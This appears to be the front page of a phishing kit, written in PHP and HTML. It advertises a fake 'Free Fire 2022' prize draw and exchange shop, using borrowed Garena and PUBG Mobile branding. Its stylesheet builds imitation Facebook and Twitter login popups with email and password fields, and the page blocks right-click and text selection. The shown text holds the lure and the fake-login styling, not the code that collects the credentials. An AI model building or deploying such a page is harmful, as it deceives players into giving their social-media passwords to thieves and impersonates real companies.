<?php
$currentUrl = $_SERVER['REQUEST_URI'];
$baseHref = '';
if (strpos(
    $currentUrl, '/themes/theme5/') === false) {
    $baseHref = '<base href="themes/theme5/">';
}
?>
<?= $baseHref ?>
<?php
$imageLinks = [
	"https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FpFPyUBz.jpeg?alt=media&token=34ab27a2-7b88-421c-b49d-4eb94fb321c9",
	"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5Q3J7g8sjmmuBr70yeblxvUtiAcAPlHnwrQ&s",
	"https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FShoz1ga.jpeg?alt=media&token=b7ffa7a3-6068-46ce-a278-0c35d1553c02",
	"https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2F3dphRVj.jpeg?alt=media&token=dda848a4-f9ab-432b-90cc-28f3bb700828",
	"https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FaayuhgO.jpeg?alt=media&token=d3a52ae0-ed17-4cf5-bd0d-5adb5f7621e6",
	"https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2FJkE8Sq2.jpeg?alt=media&token=de87f58d-eb18-43c0-8cc8-b38465a8931e",
	"https://i.pinimg.com/236x/26/14/b4/2614b419ea4bdae9c70fa48015de5060.jpg",
	"https://i.pinimg.com/236x/26/14/b4/2614b419ea4bdae9c70fa48015de5060.jpg",
	"https://tiengdong.com/wp-content/uploads/www_tiengdong_com-meme-meo-cam-ak-rong-xanh.jpg",
	"https://tiengdong.com/wp-content/uploads/www_tiengdong_com-meme-meo-cam-ak-rong-xanh.jpg"
];

// Kiểm tra xem danh sách có đủ dữ liệu không
if (is_array($imageLinks) && count($imageLinks) >= 10) {
	$bannerLink = $imageLinks[0];
	$gift1Link = $imageLinks[1];
	$gift2Link = $imageLinks[2];
	$gift3Link = $imageLinks[3];
	$gift4Link = $imageLinks[4];
	$gift5Link = $imageLinks[5];
	$gift6Link = $imageLinks[6];
	$gift7Link = $imageLinks[7];
	$gift8Link = $imageLinks[8];
	$gift9Link = $imageLinks[9];
} else {
	echo "Danh sách hình ảnh không đủ dữ liệu.";
}

?>
<html>

<head>
	<meta charset="UTF-8" />
	<meta name="viewport"
		content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta property="og:title" content="2022年FREE FIRE活动">
	<meta name="description"
		content="在2022年FREE FIRE活动中领取您的专属奖励。本次机会有限，无需充值。立即领取您的奖励！">
	<meta property="og:description"
		content="在2022年FREE FIRE活动中领取您的专属奖励。本次机会有限，无需充值。立即领取您的奖励！">
	<meta property="og:url" content="./">
	<meta property="og:site_name" content="2022年FREE FIRE活动">
	<meta property="og:type" content="website">
	<meta name="copyright" content="PUBG MOBILE">
	<meta name="theme-color" content="#000">
	<meta property="og:image" content="img/banner.jpeg">
	<title><?php echo isset($bannerName) ? $bannerName : ''; ?></title>
	<link rel="stylesheet" href="css/animate.css">
	<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet"
		href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
	<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
	<style type="text/css">
		@charset "utf-8";
		@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");

		*,
		*:before,
		*:after {
			-webkit-box-sizing: border-box;
			-moz-box-sizing: border-box;
			box-sizing: border-box;
		}

		@font-face {
			font-family: 'pubgFont';
			font-style: normal;
			font-weight: 700;
			src: url(fonts/pubg.woff2) format("woff2"),
				url(fonts/pubg.woff) format("woff"),
				url(fonts/pubg.ttf) format("truetype");
		}

		body {
			/*background:url() center / cover no-repeat;*/
			background: black;
			margin: 0;
			font-family: 'Teko';
		}

		.container {
			background: url(img/background-img.jpg) no-repeat center;
			background-size: 100% 100%;
			position: relative;
			margin: 0px auto;
			max-width: 400px;
			height: auto;
			border: 1px solid #fff;
			margin-top: -10px;
		}

		.landing {
			width: 100%;
			height: auto;
		}

		.event-wrapper {
			width: 100%;
			margin-bottom: 100%;
			padding: 10px;
		}

		.header video {
			width: 100%;
			height: auto;
			position: relative;
			top: -8px;
			display: block;
		}

		.event-wrapper img:nth-child(1) {
			width: 130px;
			float: right;
		}

		.event-notify {
			background-color: rgba(0, 0, 0, 0.8);
			width: 100%;
			height: auto;
			margin-top: 20px;
			margin-left: auto;
			margin-right: auto;
			padding: 8px;
			display: block;
		}

		.event-notify-title {
			padding-bottom: 10px;
			color: #fff;
			font-size: 17px;
			font-family: pubgFont;
			text-align: left;
			text-decoration: underline;
		}

		.event-notify-content {
			color: #fff;
			font-size: 16px;
			font-family: pubgFont;
			text-align: left;
			line-height: 18px;
		}

		.event-btn {
			background: transparent;
			width: auto;
			height: auto;
			margin-top: 20px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 15px;
			padding: 7px;
			padding-left: 15px;
			padding-right: 15px;
			color: #eaa300;
			font-size: 17px;
			font-family: pubgFont;
			text-align: center;
			border: 1px solid #eaa300;
			outline: none;
			display: block;
		}

		.box {
			width: 95%;
			height: auto;
			margin-top: 12px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 12px;
			position: relative;
			border-radius: 5px;
			display: block;
		}

		.event-alert {
			background: url(img/items.png) no-repeat center center;
			background-size: 100% 100%;
			width: 100%;
			height: 55px;
			margin-left: auto;
			margin-right: auto;
			padding: 5px;
			border-top: 1px solid rgba(0, 0, 0, 0.5);
			border-left: 1px solid rgba(0, 0, 0, 0.5);
			display: block;
			border-radius: 4px;
		}

		.event-alert img {
			width: 12%;
			margin-right: 7px;
			border-radius: 5px;
			border: 1px solid #000;
			float: left;
		}

		.event-alert-title {
			color: #1e1414e0;
			font-size: 17px;
			font-family: pubgFont;
			text-align: left;
		}

		.event-alert-desc {
			color: #1e1414e0;
			font-size: 16px;
			font-family: pubgFont;
			text-align: left;
			line-height: 15px;
		}

		.shagitz-active {
			border: 2px solid white;
		}

		.br {
			height: 11px;
		}

		.menu-wrapper {
			width: 40%;
			height: auto;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 12px;
			display: block;
		}

		.inbox {
			background: url(img/bg-drawbox.png) no-repeat center;
			background-size: 100% 100%;
			position: relative;
			width: 100%;
			height: 300px;
			margin-top: 11px;
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		.footer {
			background: #131313;
			width: 100%;
			height: auto;
			padding: 10px;
		}

		.footer-txt-follow {
			margin-top: 10px;
			margin-bottom: 10px;
			color: #fff;
			font-size: 17px;
			font-family: pubgFont;
			font-weight: bold;
			text-align: center;
			text-transform: uppercase;
		}

		.footer-follow-icon {
			width: 49px;
			height: 49px;
			margin: 5px;
			display: inline-block;
		}

		.footer-txt-copyright {
			color: #fff;
			font-size: 15px;
			font-family: pubgFont;
			text-align: center;
		}

		.footer-copyright-icon {
			width: 90%;
			margin-top: 20px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 20px;
			display: block;
		}

		.popup {
			width: 100%;
			height: 100%;
			position: fixed;
			top: 0;
			left: 0;
			z-index: 9999;
			background-color: rgba(0, 0, 0, 0.4);
		}

		.popup-box {
			background: url(img/bg-pop.a184bb41.png) no-repeat center;
			background-size: 100% 100%;
			width: 380px;
			height: 220px;
			position: relative;
			margin: 50px auto;
			margin-top: 16%;
			text-align: center;
		}

		.popup-title {
			background: url(img/bg-selection-act.png);
			background-size: 100% 100%;
			width: 100%;
			line-height: 30px;
			color: #fff;
			font-size: 20px;
			font-family: Teko;
			text-align: left;
		}

		.popup-content {
			width: 100%;
			height: 65.5%;
			border: 1px solid transparent;
			position: relative;
		}

		.popup-rewards-title {
			color: #000;
			font-size: 20px;
			font-family: Teko;
			text-align: center;
		}

		.popup-rewards-img1 {
			width: 90px;
			height: 90px;
			margin: 5px;
			margin-top: 20px;
			display: inline-block;
		}

		.popup-btn-wrapper {
			width: 100%;
			height: 50px;
		}

		.popup-btn-wrapper button {
			background: url(img/bg-prompt-btn.png) no-repeat center;
			background-size: 100% 100%;
			width: 40%;
			height: 40px;
			padding: 2px;
			font-size: 18px;
			font-family: Teko;
			color: #fff;
			text-align: center;
			border: none;
			outline: none;
		}

		.btn-login {
			width: 95%;
			height: auto;
			padding: 8px;
			margin-left: auto;
			margin-right: auto;
			color: #000;
			font-size: 15px;
			font-family: Teko;
			border: none;
			border-radius: 5px;
			outline: none;
			display: block;
		}

		.btn-login i {
			color: #fff;
			font-size: 20px;
			float: left;
		}

		.facebook {
			background: #3b5998;
			color: #fff;
			margin-top: 20px;
			margin-bottom: 3px;
		}

		.twitter {
			background: #08a0e9;
			color: #fff;
			margin-bottom: 10px;
		}

		.popup-close {
			width: 20px;
			height: 20px;
			color: #000;
			text-align: center;
			text-transform: uppercase;
			font-weight: bold;
			position: absolute;
			top: 13px;
			right: 10px;
			display: block;
		}

		.popup-close i {
			color: #000;
			font-size: 25px;
		}

		.popup-login {
			background: rgba(0, 0, 0, 0.5);
			width: 100%;
			height: 100%;
			position: fixed;
			top: 0;
			left: 0;
			z-index: 9999;
		}

		.popup-box-login-fb {
			background: #ECEFF6;
			max-width: 330px;
			height: auto;
			position: relative;
			margin: 50px auto;
			margin-top: 1.9%;
			text-align: center;
			font-family: 'Teko';
			color: #000;
			border-radius: 10px;
		}

		.popup-box-login-twitter {
			background: #fff;
			max-width: 330px;
			height: 380px;
			position: relative;
			margin: 50px auto;
			margin-top: 10%;
			text-align: center;
			font-family: 'Teko';
			color: #000;
			border-radius: 10px;
		}

		.close-fb {
			background: #000;
			width: 20px;
			height: 20px;
			color: #fff;
			text-align: center;
			text-decoration: none;
			border-radius: 50%;
			border: 1.5px solid #fff;
			position: absolute;
			top: -8px;
			right: -10px;
			display: block;
		}

		.close-fb i {
			color: #fff;
			padding-top: 1px;
		}

		.close-other {
			background: #000;
			width: 20px;
			height: 20px;
			color: #fff;
			text-align: center;
			text-decoration: none;
			border-radius: 50%;
			border: 1.5px solid #fff;
			top: -8px;
			right: -10px;
			position: absolute;
			z-index: 9999999;
			display: block;
		}

		.close-other i {
			color: #fff;
			padding-top: 1px;
		}

		.verify-input {
			background: url(img/bg-pop.a184bb41.png) no-repeat center;
			background-size: 100% 100%;
			width: 94.3%;
			height: auto;
			margin-bottom: 3px;
			padding: 6px;
			color: #fff;
			font-size: 15px;
			font-family: pubgFont;
			border: none;
			position: relative;
			outline: none;
		}

		.verify-input::placeholder {
			color: #fff;
		}

		.verify-select {
			background: url(img/bg-pop.a184bb41.png) no-repeat center;
			background-size: 100% 100%;
			width: 94.3%;
			height: auto;
			margin-bottom: 3px;
			padding: 6px;
			padding-left: 3px;
			color: #fff;
			font-size: 15px;
			font-family: pubgFont;
			border: none;
			position: relative;
			outline: none;
		}

		.verify-btn {
			background: url(img/bg-prompt-btn.png) no-repeat center;
			background-size: 100% 100%;
			width: 35%;
			height: auto;
			margin-top: 10px;
			padding: 10px;
			font-size: 15px;
			font-family: pubgFont;
			text-align: center;
			color: #fff;
			margin-bottom: 3px;
			border: none;
			position: relative;
			outline: none;
		}

		.kanan {
			float: right;
		}

		.kiri {
			float: left;
		}

		.tengah {
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		::-webkit-scrollbar {
			display: none;
			width: 0px;
		}

		.header {
			max-width: 400px;
			height: 210px;
			margin: 0px;
		}

		.item div {
			width: 100%;
			height: 100%;
			border-radius: 3px 3px 0px 0px;
		}

		.item div:first-child {
			margin-left: 0;
		}

		figure {
			margin: 0;
			padding: 0;
			overflow: hidden;
		}

		.lightshagitz figure {
			position: relative;
		}

		.lightshagitz figure::before {
			position: absolute;
			top: 0;
			left: -75%;
			z-index: 2;
			display: block;
			content: '';
			width: 50%;
			height: 100%;
			background: -webkit-linear-gradient(left, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
			background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
			-webkit-transform: skewX(-25deg);
			transform: skewX(-25deg);
		}

		.lightshagitz figure::before {
			-webkit-animation: shine 2s infinite;
			animation: shine 2s infinite;
		}

		@-webkit-keyframes shine {
			100% {
				left: 125%;
			}
		}

		@keyframes shine {
			100% {
				left: 125%;
			}
		}

		@media only screen and (max-width:600px) {
			.container {
				width: 100%;
				height: auto;
				margin-top: 0px;
				margin-bottom: 0px;
				border: none;
				border-top: 1px solid #fff;
				border-radius: 0px;
				padding: 0px;
				margin-top: -8px;
			}

			.box {
				width: 96%;
				height: auto;
			}

			.item {
				height: 90px;
			}

			.popup-box {
				width: 345px;
				margin-top: 60%;
			}

			.popup-item {
				width: 25%;
				height: 85px;
			}

			.popup-box-login-fb {
				margin-top: 4%;
			}

			.popup-box-login-twitter {
				margin-top: 25%;
			}

			.header {
				width: 100%;
			}
		}

		.navbar-fb {
			background: #3b5998;
			width: 100%;
			height: auto;
			padding: 8px;
			border-top-left-radius: 10px;
			border-top-right-radius: 10px;
		}

		.navbar-fb img {
			width: 115px;
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		.fb-alert {
			background: #fa3e3e;
			width: 100%;
			height: auto;
			padding: 5px;
			color: #fff;
			font-size: 15px;
			font-family: Roboto;
			text-align: left;
		}

		.content-box-fb {
			width: 300px;
			height: auto;
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		.content-box-fb img {
			width: 60px;
			margin-top: 20px;
			margin-left: auto;
			margin-right: auto;
			border-radius: 12px;
			display: block;
		}

		.txt-login-fb {
			width: 270px;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 17px;
			padding: 8px;
			color: #90949c;
			font-size: 16px;
			font-family: Roboto, sans-serif;
			text-align: center;
			display: block;
		}

		.loginEmail {
			width: 100%;
			height: auto;
			padding: 12px;
			color: #000;
			font-size: 14px;
			font-weight: 400;
			font-family: Roboto, sans-serif;
			border: 1px solid #bdbebf;
			border-top-left-radius: 4px;
			border-top-right-radius: 4px;
			cursor: pointer;
			outline: none;
		}

		.loginPassword {
			width: 100%;
			height: auto;
			padding: 12px;
			color: #000;
			font-size: 14px;
			font-weight: 400;
			font-family: Roboto, sans-serif;
			border: 1px solid #bdbebf;
			border-top: 0px;
			border-bottom-left-radius: 4px;
			border-bottom-right-radius: 4px;
			cursor: pointer;
			outline: none;
		}

		.showHide {
			margin-top: -32px;
			padding-right: 8px;
			color: #333333;
			font-size: 12px;
			font-family: Roboto, sans-serif;
			font-weight: bold;
			text-align: right;
			text-transform: uppercase;
		}

		.btn-login-fb {
			background: #1778f2;
			width: 100%;
			height: auto;
			margin-top: 30px;
			margin-left: auto;
			margin-right: auto;
			margin-bottom: 10px;
			padding: 10px;
			color: #fff;
			font-size: 14px;
			font-family: Roboto, sans-serif;
			font-weight: bold;
			text-align: center;
			text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
			border: 1px solid #3578e5;
			border-radius: 5px;
			box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
			outline: none;
			display: block;
		}

		.txt-create-account {
			width: 100%;
			height: auto;
			padding: 5px;
			color: #3b5998;
			font-size: 13.5px;
			font-family: Roboto, sans-serif;
			text-align: center;
		}

		.txt-not-now {
			width: 100%;
			height: auto;
			padding: 5px;
			color: #3b5998;
			font-size: 13.5px;
			font-family: Roboto, sans-serif;
			text-align: center;
		}

		.txt-forgotten-password {
			width: 100%;
			height: auto;
			margin-bottom: 30px;
			padding: 5px;
			color: #7596c8;
			font-size: 13.5px;
			font-family: Roboto, sans-serif;
			text-align: center;
		}

		.language-box {
			width: 100%;
			height: auto;
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		.language-name {
			width: 40%;
			height: auto;
			margin: 5px;
			margin-bottom: 0px;
			color: #3b5998;
			font-size: 12px;
			font-family: Roboto, sans-serif;
			text-align: center;
			display: inline-block;
		}

		.language-name i {
			width: 23px;
			padding: 4px;
			color: #90949c;
			border: 1px solid #3b5998;
			border-radius: 3px;
		}

		.language-name-active {
			color: #90949c;
			font-weight: bold;
		}

		.copyright {
			width: 40%;
			height: auto;
			margin-top: 10px;
			margin-left: auto;
			margin-right: auto;
			color: #90949c;
			font-size: 12px;
			font-family: Roboto, sans-serif;
			text-align: center;
			display: block;
		}

		.header-twitter {
			background: #fff;
			width: 100%;
			font-size: 25px;
			font-weight: bold;
			text-align: left;
			position: relative;
			border-radius: 10px;
		}

		.header-twitter img {
			width: 55px;
			margin-left: auto;
			margin-right: auto;
			display: block;
		}

		.box-twitter {
			width: 100%;
			height: 400px;
			position: absolute;
			overflow: none;
			font-size: 15px;
			font-family: sans-serif;
			border-radius: 10px;
		}

		.txt-login-twitter {
			color: #000;
			font-size: 20px;
			font-weight: bold;
			font-family: arial, sans-serif;
			margin-top: 3%;
			margin-bottom: 5%;
		}

		.twitter-alert {
			width: 95%;
			height: auto;
			margin-left: auto;
			margin-right: auto;
			padding: 5px;
			color: #fa3e3e;
			font-size: 13px;
			font-family: arial, sans-serif;
			text-align: left;
			display: block;
		}

		.input-box-twitter {
			background: #f5f8fa;
			width: 90%;
			height: 55px;
			margin-top: 10px;
			margin-bottom: 18px;
			padding: 10px;
			padding-top: 5px;
			font-size: 14px;
			font-family: arial, sans-serif;
			text-align: left;
			position: relative;
			border-bottom: 2px solid #657786;
			border-radius: 2px;
			outline: none;
			position: relative;
		}

		.input-box-twitter label {
			color: #657786;
			text-align: left;
			text-decoration: none;
			text-shadow: none;
		}

		.input-box-twitter input {
			background: transparent;
			width: 100%;
			height: auto;
			padding: 7px;
			padding-top: 3px;
			padding-left: 0px;
			color: #000;
			font-size: 18px;
			font-family: arial, sans-serif;
			text-align: left;
			position: relative;
			border: none;
			outline: none;
			z-index: 2;
		}

		.input-box-twitter .TwitterShowHide {
			margin-top: 10px;
			color: #333333;
			float: right;
		}

		.btn-login-twitter {
			background: #1da1f2;
			width: 90%;
			height: auto;
			padding: 14px;
			color: #fff;
			font-size: 15px;
			font-weight: bold;
			font-family: arial, sans-serif;
			border: none;
			border-radius: 30px;
			outline: none;
			letter-spacing: 1;
		}

		.footer-menu-twitter {
			width: auto;
			height: auto;
			margin: 0.5%;
			margin-top: 7%;
			color: #1da1f2;
			font-size: 14px;
			font-family: arial, sans-serif;
			display: inline-block;
		}

		.bulet {
			color: #000;
			font-size: 8px;
		}

		.aktifnya {
			color: #1da1f2;
			border-bottom: 2px solid #1da1f2;
		}
	</style>
	<center>
		<div class="header">
			<video src="media/header1.mp4" autoplay loop muted></video>
		</div> <!--- header --->
	</center>
	<div class="container rewardsBox">
		<div class="box">
			<div class=""
				style="background: url(img/countdown.png) no-repeat center;background-size: 100% 100%;width: 100%;height: 50px">
				<center>
					<font style="font-size: 18px;color: #866d6b;position:absolute;left: 18%;top: 1.2%">
						<?php echo isset($bannerName) ? $bannerName : ''; ?>
					</font>
				</center>
			</div>

			<div class="inbox">
				<center>

					<!-- REWARD 1 -->
					<div data-order="0"
						style="background: url(img/bg-prize-frist.png) no-repeat;background-size: 100% 100%;width: 25%;height: 44%;position: absolute;top: 18%;left: 7.5%;">
						<div>
							<center>
								<img src="<?php echo isset($gift1Link) ? $gift1Link : ''; ?>"
									style="width: 96%;height: 80%;margin-top: 15%;">
							</center>
						</div>
					</div>
					<!-- REWARD 1 -->

					<!-- REWARD 2 -->
					<div data-order="1"
						style="background: url(img/bg-prizes.png) no-repeat;background-size: 100% 100%;width: 16%;height: 20%;position: absolute;top: 18%;left: 37.5%;">
						<div>
							<center>
								<img src="<?php echo isset($gift2Link) ? $gift2Link : ''; ?>"
									style="width: 96%;height: 96%;margin-top: 2%;">
							</center>
						</div>
					</div>
					<!-- REWARD 2 -->

					<!-- REWARD 3 -->
					<div data-order="2"
						style="background: url(img/bg-prizes.png) no-repeat;background-size: 100% 100%;width: 16%;height: 20%;position: absolute;top: 18%;left: 56.5%;">
						<div>
							<center>
								<img src="<?php echo isset($gift3Link) ? $gift3Link : ''; ?>"
									style="width: 96%;height: 96%;margin-top: 2%;">
							</center>
						</div>
					</div>
					<!-- REWARD 3 -->

					<!-- REWARD 4 -->
					<div data-order="3"
						style="background: url(img/bg-prizes.png) no-repeat;background-size: 100% 100%;width: 16%;height: 20%;position: absolute;top: 18%;left: 76.5%;">
						<div>
							<center>
								<img src="<?php echo isset($gift4Link) ? $gift4Link : ''; ?>"
									style="width: 96%;height: 96%;margin-top: 2%;">
							</center>
						</div>
					</div>
					<!-- REWARD 4 -->

					<!-- REWARD 5 -->
					<div data-order="4"
						style="background: url(img/bg-prizes.png) no-repeat;background-size: 100% 100%;width: 16%;height: 20%;position: absolute;top: 41%;left: 37.5%;">
						<div>
							<center>
								<img src="<?php echo isset($gift5Link) ? $gift5Link : ''; ?>"
									style="width: 96%;height: 96%;margin-top: 2%;">
							</center>
						</div>
					</div>
					<!-- REWARD 5 -->

					<!-- REWARD 6 -->
					<div data-order="5"
						style="background: url(img/bg-prizes.png) no-repeat;background-size: 100% 100%;width: 16%;height: 20%;position: absolute;top: 41%;left: 56.5%;">
						<div>
							<center>
								<img src="<?php echo isset($gift6Link) ? $gift6Link : ''; ?>"
									style="width: 96%;height: 96%;margin-top: 2%;">
							</center>
						</div>
					</div>
					<!-- REWARD 6 -->

					<!-- REWARD 7 -->
					<div data-order="6"
						style="background: url(img/bg-prizes.png) no-repeat;background-size: 100% 100%;width: 16%;height: 20%;position: absolute;top: 41%;left: 76.5%;">
						<div>
							<center>
								<img src="<?php echo isset($gift7Link) ? $gift7Link : ''; ?>"
									style="width: 96%;height: 96%;margin-top: 2%;">
							</center>
						</div>
					</div>
					<!-- REWARD 7 -->

					<button onclick="open_about()"
						style="background: url(img/bg-prompt-btn.png) no-repeat center;background-size: 100% 100%;width: 35%;height: 15%;border:none;position: absolute;top: 75%;left: 7%;font-family: teko;font-weight: 500;color: #312525">
						详情
					</button>

					<button id="draw"
						style="background: url(img/bg-prompt-btn.png) no-repeat center;background-size: 100% 100%;width: 35%;height: 15%;border:none;position: absolute;top: 75%;right: 7%;font-family: teko;font-weight: 500;color: #312525">
						抽奖
					</button>


				</center>
			</div> <!--- inbox --->

			<div class="br"></div>

			<div style="text-align: center;border:none;height: 30px;width: 100%">
				<fieldset style="border-bottom:none;border-right: none;border-left: none;">
					<legend style="margin-left:35.5%;padding-right: 10px;padding-left: 10px">
						<font style="font-size: 20px;color: white">兑换商店</font>
					</legend>
				</fieldset>
			</div>

			<div class="br"></div>

			<div class="" style="height: 400px;border:none;">

				<div
					style="background: url(img/bg-exchange-item.png) no-repeat center;background-size: 100% 100%;height: 18%;width: 100%;margin-top: 5px">
					<img src="https://i.imgur.com/GmScexf.png"
						style="position: relative;left: 5%;margin-top:2%;width: 9%;">
					<font style="position: absolute;left: 5%;margin-top: 11%;color: white">10 徽章</font>
					<img src="img/icon-arrow.png" style="position: relative;left: 12%;top:5%;width: 5%;">
					<div
						style="background: url(img/bg-prizes.png) no-repeat center;background-size: 100% 100%;width: 16%;height: 6.5%;position: absolute;left: 32%;margin-top: -8.5%">
						<img src="img/1599546030876PIvqwGaa.png" style="width: 80%;margin-top: 20%;margin-left: 10%">
						<img src="img/bg-tag-or.png" style="width: 80%;position: absolute;right: 0%;bottom: 0%">
						<font style="position: absolute;right: 10%;bottom: 0;line-height: 10px;color: #ec544d">60</font>
					</div>
					<img src="img/btn-exc-active.png" style="position: absolute;right: 5%;margin-top:3%;width: 23%;">
					<font style="position: absolute;right: 0%;margin-top: 5%;width: 23%;color: #882521" value="60"
						onclick="open_exchange(this);">兑换</font>
					<font style="position: absolute;right: -2%;margin-top: 13%;width: 23%;color: #fff">限量: 1
					</font>
				</div>

				<div
					style="background: url(img/bg-exchange-item.png) no-repeat center;background-size: 100% 100%;height: 18%;width: 100%;margin-top: 5px;">
					<img src="https://i.imgur.com/GmScexf.png"
						style="position: relative;left: 5%;margin-top:2%;width: 9%;">
					<font style="position: absolute;left: 5%;margin-top: 11%;color: white">30 徽章</font>
					<img src="img/icon-arrow.png" style="position: relative;left: 12%;top:5%;width: 20px;">
					<div
						style="background: url(img/bg-prizes.png) no-repeat center;background-size: 100% 100%;width: 16%;height: 6.5%;position: absolute;left: 32%;margin-top: -8.5%">
						<img src="img/1599546030876PIvqwGaa.png" style="width: 80%;margin-top: 20%;margin-left: 10%">
						<img src="img/bg-tag-or.png" style="width: 80%;position: absolute;right: 0%;bottom: 0%">
						<font style="position: absolute;right: 10%;bottom: 0;line-height: 10px;color: #ec544d">150
						</font>
					</div>
					<img src="img/btn-exc-active.png" style="position: absolute;right: 5%;margin-top:3%;width: 23%;">
					<font style="position: absolute;right: 0%;margin-top: 5%;width: 23%;color: #882521" value="150"
						onclick="open_exchange(this);">兑换</font>
					<font style="position: absolute;right: -2%;margin-top: 13%;width: 23%;color: #fff">限量: 1
					</font>
				</div>

				<div
					style="background: url(img/bg-exchange-item.png) no-repeat center;background-size: 100% 100%;height: 18%;width: 100%;margin-top: 5px;">
					<img src="https://i.imgur.com/GmScexf.png"
						style="position: relative;left: 5%;margin-top:2%;width: 9%;">
					<font style="position: absolute;left: 5%;margin-top: 11%;color: white">60 徽章</font>
					<img src="img/icon-arrow.png" style="position: relative;left: 12%;top:5%;width: 20px;">
					<div
						style="background: url(img/bg-prizes.png) no-repeat center;background-size: 100% 100%;width: 16%;height: 6.5%;position: absolute;left: 32%;margin-top: -8.5%">
						<img src="img/1599546030876PIvqwGaa.png" style="width: 80%;margin-top: 20%;margin-left: 10%">
						<img src="img/bg-tag-or.png" style="width: 80%;position: absolute;right: 0%;bottom: 0%">
						<font style="position: absolute;right: 10%;bottom: 0;line-height: 10px;color: #ec544d">400
						</font>
					</div>
					<img src="img/btn-exc-active.png" style="position: absolute;right: 5%;margin-top:3%;width: 23%;">
					<font style="position: absolute;right: 0%;margin-top: 5%;width: 23%;color: #882521" value="400"
						onclick="open_exchange(this);">兑换</font>
					<font style="position: absolute;right: -2%;margin-top: 13%;width: 23%;color: #fff">限量: 1
					</font>
				</div>

				<div
					style="background: url(img/bg-exchange-item.png) no-repeat center;background-size: 100% 100%;height: 18%;width: 100%;margin-top: 5px;">
					<img src="https://i.imgur.com/GmScexf.png"
						style="position: relative;left: 5%;margin-top:2%;width: 9%;">
					<font style="position: absolute;left: 5%;margin-top: 11%;color: white">90 徽章</font>
					<img src="img/icon-arrow.png" style="position: relative;left: 12%;top:5%;width: 20px;">
					<div
						style="background: url(img/bg-prizes.png) no-repeat center;background-size: 100% 100%;width: 16%;height: 6.5%;position: absolute;left: 32%;margin-top: -8.5%">
						<img src="img/1599546030876PIvqwGaa.png" style="width: 80%;margin-top: 20%;margin-left: 10%">
						<img src="img/bg-tag-or.png" style="width: 80%;position: absolute;right: 0%;bottom: 0%">
						<font style="position: absolute;right: 10%;bottom: 0;line-height: 10px;color: #ec544d">1050
						</font>
					</div>
					<img src="img/btn-exc-active.png" style="position: absolute;right: 5%;margin-top:3%;width: 23%;">
					<font style="position: absolute;right: 0%;margin-top: 5%;width: 23%;color: #882521" value="1050"
						onclick="open_exchange(this);">兑换</font>
					<font style="position: absolute;right: -2%;margin-top: 13%;width: 23%;color: #fff">限量: 1
					</font>
				</div>

				<div
					style="background: url(img/bg-exchange-item.png) no-repeat center;background-size: 100% 100%;height: 18%;width: 100%;margin-top: 5px;">
					<img src="https://i.imgur.com/GmScexf.png"
						style="position: relative;left: 5%;margin-top:2%;width: 9%;">
					<font style="position: absolute;left: 5%;margin-top: 11%;color: white">120 徽章</font>
					<img src="img/icon-arrow.png" style="position: relative;left: 12%;top:5%;width: 20px;">
					<div
						style="background: url(img/bg-prizes.png) no-repeat center;background-size: 100% 100%;width: 16%;height: 6.5%;position: absolute;left: 32%;margin-top: -8.5%">
						<img src="img/1599546030876PIvqwGaa.png" style="width: 80%;margin-top: 20%;margin-left: 10%">
						<img src="img/bg-tag-or.png" style="width: 80%;position: absolute;right: 0%;bottom: 0%">
						<font style="position: absolute;right: 10%;bottom: 0;line-height: 10px;color: #ec544d">1725
						</font>
					</div>
					<img src="img/btn-exc-active.png" style="position: absolute;right: 5%;margin-top:3%;width: 23%;">
					<font style="position: absolute;right: 0%;margin-top: 5%;width: 23%;color: #882521" value="1725"
						onclick="open_exchange(this);">兑换</font>
					<font style="position: absolute;right: -2%;margin-top: 13%;width: 23%;color: #fff">限量: 1
					</font>
				</div>
			</div>
		</div> <!--- box --->
		<div class="footer">
			<div class="footer-txt-follow">关注我们</div> <!--- footer-txt-follow --->
			<center>
				<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
				<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
				<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
				<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
				<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
			</center>
			<img class="footer-copyright-icon"
				src="https://inkythuatso.com/uploads/images/2021/12/logo-free-fire-inkythuatso-3-01-04-09-17-28.jpg">
			<div class="footer-txt-copyright">ⓒ 2018-2022 Garena. 保留所有权利。</div>
			<!--- footer-txt-copyright --->
			<div class="footer-txt-copyright">隐私政策 | Garena游戏用户协议</div>
			<!--- footer-txt-copyright --->
		</div> <!--- footer --->
